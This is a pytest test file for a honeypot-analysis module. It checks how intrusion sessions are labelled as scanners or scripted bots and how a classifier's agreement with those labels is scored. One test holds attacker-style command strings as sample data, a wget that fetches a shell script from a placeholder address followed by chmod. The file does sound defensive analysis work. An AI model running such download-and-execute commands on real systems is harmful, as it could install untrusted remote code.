"""The real-traffic checks: the heuristic labels and how agreement with them is counted."""

from __future__ import annotations

import pytest
from mirage_intel import realcheck

pytestmark = pytest.mark.ml


def session(src, commands, auth_success=1):
    return {"src": src, "commands": commands, "auth_success": auth_success, "inputs": len(commands)}


def test_the_heuristics_are_the_two_the_spec_names():
    same = ["uname -a", "cat /proc/cpuinfo"]
    sessions = [
        session("a", [], auth_success=0),  # no login
        session("a", []),  # logged in, typed nothing
        session("a", ["uname -a"], auth_success=0),  # a command but no login
        session("a", same),
        session("b", ["uname -a", "cat /proc/cpuinfo"]),
        session("c", ["uname  -a", "cat /proc/cpuinfo"]),  # the same up to whitespace
        session("d", ["whoami"]),  # nobody else did this
        session("d", ["whoami"]),  # ... and one source repeating itself is not "many"
    ]
    assert realcheck.heuristic_labels(sessions) == [
        "scanner", "scanner", "scanner", "scripted_bot", "scripted_bot", "scripted_bot", "", "",
    ]  # fmt: skip
    # fewer sources than the bar: the sequence is no longer called a bot's
    assert realcheck.heuristic_labels(sessions[:5]).count("scripted_bot") == 0


def test_a_sequence_is_the_same_whatever_address_or_number_it_carries():
    a = realcheck.sequence_key(["wget http://203.0.113.5/x.sh", "chmod 777 x.sh"])
    b = realcheck.sequence_key(["wget http://198.51.100.77/x.sh", "chmod 755 x.sh"])
    assert a == b != realcheck.sequence_key(["chmod 777 x.sh", "wget http://203.0.113.5/x.sh"])


def test_agreement_counts_only_what_a_heuristic_labels_and_resamples_sources():
    heuristic = ["scanner", "scanner", "scripted_bot", "scripted_bot", "", ""]
    predicted = ["scanner", "scripted_bot", "scripted_bot", "human", "human", "scripted_bot"]
    sources = ["a", "a", "b", "c", "d", "e"]
    out = realcheck.agreement(heuristic, predicted, sources, draws=200)
    assert out["sessions"] == 6 and out["labelled_by_a_heuristic"] == 4
    assert out["agreement"] == 0.5 and out["sources"] == 3
    assert out["agreement_ci"][0] <= 0.5 <= out["agreement_ci"][1]
    assert out["by_heuristic"]["scanner"] == {
        "sessions": 2, "agree": 0.5, "model_said": {"scanner": 1, "scripted_bot": 1},
    }  # fmt: skip
    assert out["by_heuristic"]["scripted_bot"]["model_said"] == {"human": 1, "scripted_bot": 1}
    assert out["no_heuristic"] == {"sessions": 2, "model_said": {"human": 1, "scripted_bot": 1}}
    # nothing labelled: no agreement figure, and no division by zero
    empty = realcheck.agreement(["", ""], ["human", "human"], ["a", "b"])
    assert empty["agreement"] is None and "agreement_ci" not in empty


def test_what_the_rule_settles_is_not_counted_as_agreement():
    # 900 sessions with no login: scanner by the classifier's rule and by the heuristic, the
    # same statement twice. A model that then gets every real decision wrong must score 0,
    # not 0.9.
    heuristic = ["scanner"] * 900 + ["scripted_bot"] * 100
    predicted = ["scanner"] * 900 + ["human"] * 100
    decided = ["rule"] * 900 + ["model"] * 100
    sources = [f"s{i % 50}" for i in range(1000)]
    out = realcheck.agreement(heuristic, predicted, sources, decided, draws=100)
    assert out["settled_by_the_rule"]["sessions"] == 900
    assert out["decided_by_the_model"] == out["labelled_by_a_heuristic"] == 100
    assert out["agreement"] == 0.0 and out["by_heuristic"]["scanner"]["sessions"] == 0
